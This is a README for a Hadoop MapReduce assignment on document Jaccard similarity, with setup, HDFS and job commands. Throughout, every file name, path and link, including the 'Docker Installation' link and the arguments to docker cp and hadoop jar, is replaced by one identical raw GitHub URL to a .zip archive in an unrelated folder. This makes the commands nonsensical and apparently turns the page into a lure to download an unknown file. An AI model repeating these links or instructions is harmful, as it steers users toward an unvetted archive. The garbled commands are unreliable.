### **📌 Document Similarity Using Hadoop MapReduce**  

#### **Objective**  
The goal of this assignment is to compute the **Jaccard Similarity** between pairs of documents using **MapReduce in Hadoop**. You will implement a MapReduce job that:  
1. Extracts words from multiple text documents.  
2. Identifies which words appear in multiple documents.  
3. Computes the **Jaccard Similarity** between document pairs.  
4. Outputs document pairs with similarity **above 50%**.  

---

### **📥 Example Input**  

You will be given multiple text documents. Each document will contain several words. Your task is to compute the **Jaccard Similarity** between all pairs of documents based on the set of words they contain.  

#### **Example Documents**  

##### **https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip**  
```
hadoop is a distributed system
```

##### **https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip**  
```
hadoop is used for big data processing
```

##### **https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip**  
```
big data is important for analysis
```

---

# 📏 Jaccard Similarity Calculator

## Overview

The Jaccard Similarity is a statistic used to gauge the similarity and diversity of sample sets. It is defined as the size of the intersection divided by the size of the union of two sets.

## Formula

The Jaccard Similarity between two sets A and B is calculated as:

```
Jaccard Similarity = |A ∩ B| / |A ∪ B|
```

Where:
- `|A ∩ B|` is the number of words common to both documents
- `|A ∪ B|` is the total number of unique words in both documents

## Example Calculation

Consider two documents:
 
**https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip words**: `{hadoop, is, a, distributed, system}`
**https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip words**: `{hadoop, is, used, for, big, data, processing}`

- Common words: `{hadoop, is}`
- Total unique words: `{hadoop, is, a, distributed, system, used, for, big, data, processing}`

Jaccard Similarity calculation:
```
|A ∩ B| = 2 (common words)
|A ∪ B| = 10 (total unique words)

Jaccard Similarity = 2/10 = 0.2 or 20%
```

## Use Cases

Jaccard Similarity is commonly used in:
- Document similarity detection
- Plagiarism checking
- Recommendation systems
- Clustering algorithms

## Implementation Notes

When computing similarity for multiple documents:
- Compare each document pair
- Output pairs with similarity > 50%

### **📤 Expected Output**  

The output should show the Jaccard Similarity between document pairs in the following format:  
```
(doc1, doc2) -> 60%  
(doc2, doc3) -> 50%  
```

---

### **🛠 Environment Setup: Running Hadoop in Docker**  

Since we are using **Docker Compose** to run a Hadoop cluster, follow these steps to set up your environment.  

#### **Step 1: Install Docker & Docker Compose**  
- **Windows**: Install **Docker Desktop** and enable WSL 2 backend.  
- **macOS/Linux**: Install Docker using the official guide: [Docker Installation](https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip)  

#### **Step 2: Start the Hadoop Cluster**  
Navigate to the project directory where `https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip` is located and run:  
```sh
docker-compose up -d
```  
This will start the Hadoop NameNode, DataNode, and ResourceManager services.  

#### **Step 3: Access the Hadoop Container**  
Once the cluster is running, enter the **Hadoop master node** container:  
```sh
docker exec -it hadoop-master /bin/bash
```

---

### **📦 Building and Running the MapReduce Job with Maven**  

#### **Step 1: Build the JAR File**  
Ensure Maven is installed, then navigate to your project folder and run:  
```sh
mvn clean package
```  
This will generate a JAR file inside the `target` directory.  

#### **Step 2: Copy the JAR File to the Hadoop Container**  
Move the compiled JAR into the running Hadoop container:  
```sh
docker cp https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip
```

---

### **📂 Uploading Data to HDFS**  

#### **Step 1: Create an Input Directory in HDFS**  
Inside the Hadoop container, create the directory where input files will be stored:  
```sh
hdfs dfs -mkdir -p /input
```

#### **Step 2: Upload Dataset to HDFS**  
Copy your local dataset into the Hadoop cluster’s HDFS:  
```sh
hdfs dfs -put /path/to/local/input/* /input/
```

---

### **🚀 Running the MapReduce Job**  

Run the Hadoop job using the JAR file inside the container:  
```sh
hadoop jar https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip DocumentSimilarityDriver /input /output_similarity /output_final
```

---

### **📊 Retrieving the Output**  

To view the results stored in HDFS:  
```sh
hdfs dfs -cat /output_final/part-r-00000
```

If you want to download the output to your local machine:  
```sh
hdfs dfs -get /output_final /path/to/local/output
```
---

## Approach
## Overview

This project computes the Jaccard similarity between text documents using Hadoop MapReduce. Only document pairs with a similarity greater than 50% are output.

## Approach

- **Mapper:**  
  - Reads each file (document) line by line using the default `TextInputFormat`.
  - Uses the file name as the document ID (retrieved from the FileSplit in `setup()`).
  - Aggregates all lines in `cleanup()`, tokenizes the text (lowercase & removes non-alphanumeric characters), and emits a single record in the format:
    ```
    DocumentID \t word1,word2,...
    ```
- **Reducer:**  
  - Receives all documents with a constant key.
  - Computes pairwise Jaccard similarity.
  - Emits only document pairs with similarity > 50%.


## Step by step instructions
docker compose up -d

mvn install

mv target/*.jar shared-folder/input/code/

docker cp https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/

docker cp https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/

docker cp https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/

docker cp https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/


docker exec -it resourcemanager /bin/bash

cd /opt/hadoop-3.2.1/share/hadoop/mapreduce/

hadoop fs -mkdir -p /input/dataset

hadoop fs -put https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip /input/dataset

hadoop fs -put https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip /input/dataset

hadoop fs -put https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip /input/dataset

hadoop jar https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip /input/dataset /output

hadoop fs -cat /output/*

hdfs dfs -get /output /opt/hadoop-3.2.1/share/hadoop/mapreduce/

exit 

docker cp resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/output/ shared-folder/output/

## Challenges & Solutions
Multiple File Handling:
Used the file name from FileSplit to uniquely identify documents.

Content Aggregation:
Accumulated lines in the mapper using StringBuilder and processed in cleanup().

Similarity Filtering:
Emitted only pairs with similarity > 50% in the reducer.
